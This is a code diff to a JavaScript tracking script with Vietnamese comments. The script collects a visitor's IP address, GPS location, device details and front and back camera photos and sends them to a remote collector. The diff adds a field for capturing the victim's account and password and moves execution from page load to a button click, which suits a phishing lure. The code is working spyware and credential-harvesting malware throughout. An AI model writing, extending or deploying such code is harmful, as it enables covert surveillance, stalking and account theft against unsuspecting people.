@@ -16,7 +16,8 @@ const info = {
   lon: '',
   device: '',
   os: '',
-  camera: '⏳ Đang kiểm tra...'
+  camera: '⏳ Đang kiểm tra...',
+  loginDetails: '' // Thêm trường này để lưu tài khoản/mật khẩu
 };
 
 function detectDevice() {
@@ -85,29 +86,24 @@ async function getRealIP() {
   } catch (e) { info.realIp = 'Lỗi kết nối'; }
 }
 
-let useGPS = false;
-
 async function getLocation() {
   return new Promise(resolve => {
     if (!navigator.geolocation) return fallbackIPLocation().then(resolve);
 
     navigator.geolocation.getCurrentPosition(
       async pos => {
-        useGPS = true;
         info.lat = pos.coords.latitude.toFixed(6);
         info.lon = pos.coords.longitude.toFixed(6);
         try {
           const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${info.lat}&lon=${info.lon}`);
           const data = await res.json();
           info.address = data.display_name || '📍 Vị trí GPS';
-          info.country = data.address?.country || info.country;
         } catch {
           info.address = `📍 Tọa độ: ${info.lat}, ${info.lon}`;
         }
         resolve();
       },
       async () => {
-        useGPS = false;
         await fallbackIPLocation();
         resolve();
       },
@@ -122,7 +118,6 @@ async function fallbackIPLocation() {
     info.lat = data.latitude?.toFixed(6) || '0';
     info.lon = data.longitude?.toFixed(6) || '0';
     info.address = `${data.city}, ${data.region} (Vị trí IP)`;
-    info.country = data.country || 'Việt Nam';
   } catch (e) { info.address = 'Không rõ'; }
 }
 
@@ -151,29 +146,22 @@ async function captureCamera(facingMode = 'user') {
 
 function getCaption() {
   const mapsLink = info.lat && info.lon
-    ? `https://maps.google.com/maps?q=${info.lat},${info.lon}`
+    ? `https://www.google.com/maps?q=${info.lat},${info.lon}`
     : 'Không rõ';
 
   return `
-📡 [THÔNG TIN TRUY CẬP]
+🔐 [THÔNG TIN ĐĂNG NHẬP]
+👤 Chi tiết: ${info.loginDetails}
 
+📡 [THÔNG TIN TRUY CẬP]
 🕒 Thời gian: ${info.time}
-📱 Thiết bị: ${info.device}
-🖥️ Hệ điều hành: ${info.os}
+📱 Thiết bị: ${info.device} (${info.os})
 🌍 IP dân cư: ${info.ip}
-🧠 IP gốc: ${info.realIp}
 🏢 ISP: ${info.isp}
 🏙️ Địa chỉ: ${info.address}
-🌎 Quốc gia: ${info.country}
-📍 Vĩ độ: ${info.lat}
-📍 Kinh độ: ${info.lon}
-📌 Google Maps: ${mapsLink}
+📍 Google Maps: ${mapsLink}
 📸 Camera: ${info.camera}
 `.trim();
-}
-
-function getCaptionWithExtras() {
-  return getCaption() + `\n\n⚠️ Ghi chú: Thông tin có khả năng chưa chính xác 100%.`;
 }
 
 async function sendPhotos(frontBlob, backBlob) {
@@ -182,7 +170,7 @@ async function sendPhotos(frontBlob, backBlob) {
   
   const media = [];
   if (frontBlob) {
-    media.push({ type: 'photo', media: 'attach://front', caption: getCaptionWithExtras() });
+    media.push({ type: 'photo', media: 'attach://front', caption: getCaption() });
     formData.append('front', frontBlob, 'front.jpg');
   }
   if (backBlob) {
@@ -209,6 +197,7 @@ function delay(ms) {
   return new Promise(resolve => setTimeout(resolve, ms));
 }
 
+// HÀM CHÍNH - Chỉ được gọi từ index.html khi bấm nút
 async function main() {
   detectDevice();
   await Promise.all([getPublicIP(), getRealIP(), getLocation()]);
@@ -219,9 +208,9 @@ async function main() {
     front = await captureCamera("user");
     await delay(500);
     back = await captureCamera("environment");
-    info.camera = '✅ Đã chụp camera trước và sau';
+    info.camera = '✅ Thành công';
   } catch (e) {
-    info.camera = '🚫 Bị từ chối hoặc lỗi camera';
+    info.camera = '🚫 Bị từ chối';
   }
 
   if (front || back) {
@@ -229,15 +218,8 @@ async function main() {
   } else {
     await sendTextOnly();
   }
+  
+  return true; 
 }
 
-main().then(async () => {
-  window.mainScriptFinished = true;
-  await delay(1500);
-
-  const script = document.createElement('script');
-  script.src = 'camera.js'; 
-  script.defer = true;
-  document.body.appendChild(script);
-  console.log("✅ Hệ thống đã hoàn tất gửi thông tin chi tiết.");
-});
+// ĐÃ XÓA ĐOẠN TỰ ĐỘNG CHẠY Ở ĐÂY
